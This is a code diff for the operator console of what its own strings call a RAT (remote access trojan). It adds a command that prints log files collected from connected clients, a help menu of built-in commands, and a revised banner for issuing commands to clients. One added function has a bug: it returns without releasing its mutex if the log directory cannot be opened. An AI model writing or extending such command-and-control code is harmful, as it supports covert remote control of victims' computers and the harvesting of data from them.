@@ -1,5 +1,75 @@
 #include "serverlib.h"
 
+void print_logs()
+{
+    pthread_mutex_lock(&clients_mutex);
+
+    DIR *dir;
+    struct dirent *entry;
+    char filepath[PATH_MAX];
+
+    dir = opendir("client_logs");
+    if (dir == NULL)
+    {
+        perror("Error opening client_logs directory");
+        return;
+    }
+    write(1, "trying", 6);
+    while ((entry = readdir(dir)) != NULL)
+    {
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+            continue;
+
+        snprintf(filepath, sizeof(filepath), "client_logs/%s", entry->d_name);
+
+        int fd = open(filepath, O_RDONLY);
+        if (fd == -1)
+        {
+            perror("Error opening file");
+            continue;
+        }
+
+        struct stat st;
+        if (fstat(fd, &st) == -1)
+        {
+            perror("Error getting file size");
+            close(fd);
+            continue;
+        }
+
+        char *buffer = malloc(st.st_size + 1);
+        if (buffer == NULL)
+        {
+            perror("Error allocating memory");
+            close(fd);
+            continue;
+        }
+
+        ssize_t bytes_read = read(fd, buffer, st.st_size);
+        if (bytes_read == -1)
+        {
+            perror("Error reading file");
+            free(buffer);
+            close(fd);
+            continue;
+        }
+
+        buffer[bytes_read] = '\0';
+
+        write(1, "=== File: ", 10);
+        write(1, entry->d_name, strlen(entry->d_name));
+        write(1, " ===\n", 5);
+        write(1, buffer, bytes_read);
+        write(1, "\n\n", 2);
+
+        free(buffer);
+        close(fd);
+    }
+
+    closedir(dir);
+    pthread_mutex_unlock(&clients_mutex);
+}
+
 void list_clients()
 {
     pthread_mutex_lock(&clients_mutex);
@@ -16,6 +86,18 @@ void list_clients()
     }
 
     pthread_mutex_unlock(&clients_mutex);
+}
+
+void list_commands()
+{
+    printf("\n");
+    printf("\b%s:     clears the console\n", commands[0]);
+    printf("\b%s:      exits the RAT\n", commands[1]);
+    printf("\b%s:      list of connected clients\n", commands[2]);
+    printf("\b%s:     stats of the connected clients\n", commands[3]);
+    printf("\b%s:       log files contents\n", commands[4]);
+    printf("\b%s:  available commands\n", commands[5]);
+    printf("\n");
 }
 
 void handle_terminal_input()
@@ -62,6 +144,13 @@ void handle_terminal_input()
             exit(EXIT_SUCCESS);
         }
 
+        if (strstr(input, "commands") == input)
+        {
+            list_commands();
+            free(input);
+            continue;
+        }
+
         if (strstr(input, "clear") == input || strlen(input) == 0)
         {
             system("clear");
@@ -79,10 +168,17 @@ void handle_terminal_input()
 
         if (strstr(input, "stats") == input)
         {
-            char* processed = process_clients_statistics();
+            char *processed = process_clients_statistics();
             printf("%s", processed);
             if (processed)
                 free(processed);
+            free(input);
+            continue;
+        }
+
+        if (strstr(input, "log") == input)
+        {
+            print_logs();
             free(input);
             continue;
         }
@@ -127,7 +223,6 @@ void handle_terminal_input()
     }
 }
 
-
 void info()
 {
     printf("\n\n");
@@ -137,7 +232,7 @@ void info()
     int terminalWidth = w.ws_col;
 
     char first[] = "Enter command (clientX:command or clientX,Y,Z:command or clientX-Y:command)\n";
-    char second[] = "Use TAB for autocomplete, 'clear' to clear console, or 'exit' to quit or 'list' to list connected clients or 'stats' to show clients stats:\n";
+    char second[] = "Use TAB for autocomplete, 'commands' to print built-in available commands:\n";
 
     int textLength1 = 38;
     int textLength2 = 35;
@@ -170,6 +265,8 @@ void info()
         }
         printf("%s", RAT_LOGO[j]);
     }
+
+    printf("\n");
 
     for (int i = 0; i < padding3; ++i)
     {
